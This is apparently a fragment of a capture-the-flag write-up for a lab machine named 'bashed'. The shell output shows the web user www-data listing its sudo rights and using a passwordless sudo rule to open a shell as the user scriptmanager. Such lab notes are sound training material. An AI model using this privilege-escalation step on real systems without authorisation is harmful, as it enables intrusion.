# www-data
```
$ whoami
www-data 

$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

# scriptmanager
```
$ whoami
www-data
$ sudo -u scriptmanager /bin/bash
whoami
scriptmanager
```